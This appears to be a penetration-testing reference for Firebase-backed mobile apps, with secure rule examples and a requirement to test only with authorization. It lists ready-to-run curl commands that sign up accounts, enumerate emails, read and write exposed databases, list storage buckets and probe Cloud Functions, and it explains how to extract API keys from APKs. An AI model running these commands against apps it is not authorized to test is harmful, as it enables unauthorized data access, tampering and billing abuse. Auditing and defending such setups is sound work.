# Firebase Security Reference

Firebase security vulnerability patterns, exploitation techniques, and audit checklists for Firebase implementations in mobile applications.

## 14 Vulnerability Categories

### 1. Open Email/Password Signup (Critical)

Firebase Authentication allows anyone to create accounts via the Identity Toolkit API, even if the app UI doesn't expose registration.

**Exploitation:**
```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com","password":"Password123!","returnSecureToken":true}' \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY"
```

**Impact:** Bypass invite-only systems, access authenticated-only resources, exhaust authentication quotas.

### 2. Anonymous Authentication Enabled (High)

Anonymous auth creates real Firebase users with valid tokens, bypassing `auth != null` security rules.

**Bypassing "Authenticated Only" Rules:**
```javascript
// These rules are BYPASSED by anonymous auth
{
  "rules": {
    ".read": "auth != null",  // Anonymous user passes this!
    ".write": "auth != null"
  }
}
```

**Secure Rules (Require Real Users):**
```javascript
{
  "rules": {
    ".read": "auth != null && auth.token.email_verified == true",
    ".write": "auth != null && auth.provider !== 'anonymous'"
  }
}
```

### 3. Email Enumeration (Medium)

The `createAuthUri` endpoint reveals whether an email is registered.

**Exploitation:**
```bash
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"identifier":"victim@company.com","continueUri":"https://localhost"}' \
  "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=API_KEY"
```

### 4. Realtime Database Unauthenticated Read (Critical)

Database rules allow public read access to all data.

**Exploitation:**
```bash
curl "https://PROJECT-ID.firebaseio.com/.json"
curl "https://PROJECT-ID.firebaseio.com/.json?shallow=true"
```

### 5. Realtime Database Unauthenticated Write (Critical)

Database rules allow public write access, enabling data manipulation or injection.

**Exploitation:**
```bash
curl -X PUT \
  -H "Content-Type: application/json" \
  -d '{"attacker":"was_here"}' \
  "https://PROJECT-ID.firebaseio.com/pwned.json"
```

### 6. Firestore Open Document Access (Critical)

Firestore security rules allow public access to collections.

**Exploitation:**
```bash
curl "https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents"
```

### 7. Firebase Storage Bucket Listing (High)

Storage rules allow listing bucket contents, exposing all stored files.

**Exploitation:**
```bash
curl "https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o"
```

### 8. Firebase Storage Unauthenticated Upload (Critical)

Anyone can upload files to the storage bucket.

**Impact:** Storage quota exhaustion (billing attack), malware hosting, phishing page hosting.

### 9. Cloud Functions Unauthenticated Access (Medium-High)

HTTP-triggered Cloud Functions accessible without authentication.

**Common Function Names to Enumerate:**
```
login, logout, register, signup, authenticate, verify,
createUser, deleteUser, updateUser, getUser, getUsers,
processPayment, createOrder, sendEmail, sendNotification,
uploadFile, generateToken, validateToken, refreshToken,
getData, setData, syncData, backup, restore, export,
webhook, callback, api, admin, debug, test, healthcheck
```

**Regions to Test:**
```
us-central1, us-east1, us-east4, us-west1,
europe-west1, europe-west2, europe-west3,
asia-east1, asia-east2, asia-northeast1, asia-south1
```

### 10. Remote Config Public Exposure (Medium)

Firebase Remote Config parameters accessible with just the API key.

**Exploitation:**
```bash
curl -H "x-goog-api-key: API_KEY" \
  "https://firebaseremoteconfig.googleapis.com/v1/projects/PROJECT-ID/remoteConfig"
```

### 11. Insecure Security Rules Patterns

Common mistakes that appear secure but aren't:

- **Trusting Client Data:** Client controls privilege fields
- **Missing Validation:** No field validation on writes
- **Overly Broad Wildcards:** Matches ANY path
- **Time-Based Rules Without Server Time:** Client can manipulate timestamp

### 12. API Key Exposure and Misuse

Firebase API keys extracted from APKs can be used for various attacks.

**Extraction Locations:**
```
google-services.json          → client[].api_key[].current_key
res/values/strings.xml        → google_api_key, firebase_api_key
assets/*.json                 → apiKey, api_key
Smali code                    → const-string with "AIza"
Raw DEX strings               → strings command output
```

**API Key Format:** `AIza[A-Za-z0-9_-]{35}`

## Config Extraction Methods

### Automated Scanner

The bundled scanner script will:
1. Decompile the APK using apktool
2. Extract Firebase configuration from all sources
3. Test authentication endpoints
4. Test Realtime Database, Firestore, Storage
5. Test Cloud Functions and Remote Config
6. Generate reports in text and JSON format

### Manual Extraction

```bash
# Decompile
apktool d -f -o ./decompiled $APK_FILE

# Find google-services.json
find ./decompiled -name "google-services.json"

# Search XML resources
grep -r "firebaseio.com\|appspot.com\|AIza" ./decompiled/res/

# Search assets (hybrid apps)
grep -r "firebaseio.com\|AIza" ./decompiled/assets/
```

## Auth Testing

### Open Signup Test

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test123!","returnSecureToken":true}' \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY"
```

### Anonymous Auth Test

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"returnSecureToken":true}' \
  "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=API_KEY"
```

### Email Enumeration Test

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"identifier":"victim@company.com","continueUri":"https://localhost"}' \
  "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=API_KEY"
```

## Database Testing

### Realtime Database

```bash
# Root read
curl "https://PROJECT.firebaseio.com/.json"

# Shallow query (shows structure even if full read denied)
curl "https://PROJECT.firebaseio.com/.json?shallow=true"

# Specific paths
curl "https://PROJECT.firebaseio.com/users.json"
curl "https://PROJECT.firebaseio.com/messages.json"
```

### Firestore

```bash
# List root collections
curl "https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents"

# Read specific collection
curl "https://firestore.googleapis.com/v1/projects/PROJECT-ID/databases/(default)/documents/users"
```

## Storage Testing

```bash
# List bucket
curl "https://firebasestorage.googleapis.com/v0/b/PROJECT_ID.appspot.com/o"

# Download exposed file
curl "https://firebasestorage.googleapis.com/v0/b/PROJECT-ID.appspot.com/o/file.pdf?alt=media"
```

## Cloud Functions Testing

```bash
# Test function
curl "https://us-central1-PROJECT.cloudfunctions.net/functionName"

# Test callable function
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"data":{}}' \
  "https://us-central1-PROJECT.cloudfunctions.net/adminFunction"
```

## Severity Classification

| Severity | Issues |
|----------|--------|
| **CRITICAL** | Unauthenticated database read/write, storage write, open signup on private apps |
| **HIGH** | Anonymous auth enabled, storage bucket listing, collection enumeration |
| **MEDIUM** | Email enumeration, accessible cloud functions, remote config exposure |
| **LOW** | Information disclosure without sensitive data |

## Secure Configuration Examples

### Realtime Database Rules

```json
{
  "rules": {
    ".read": false,
    ".write": false,
    "users": {
      "$uid": {
        ".read": "$uid === auth.uid",
        ".write": "$uid === auth.uid"
      }
    },
    "public": {
      ".read": true,
      ".write": false
    }
  }
}
```

### Firestore Rules

```javascript
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
      allow read, write: if false;
    }

    match /users/{userId} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
    }

    match /public/{docId} {
      allow read: if true;
      allow write: if request.auth != null;
    }
  }
}
```

### Storage Rules

```javascript
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    match /{allPaths=**} {
      allow read, write: if false;
    }

    match /users/{userId}/{allPaths=**} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
    }

    match /public/{fileId} {
      allow read: if true;
      allow write: if request.auth != null;
    }
  }
}
```

## Important Guidelines

1. **Authorization required** - Only scan APKs you have permission to test
2. **Clean up test data** - Remove test entries created during testing
3. **Save tokens** - If anonymous auth succeeds, use the token for authenticated bypass testing
4. **Test all regions** - Cloud Functions may be deployed to multiple regions
5. **Multiple instances** - Some apps use multiple Firebase projects; test all discovered configurations
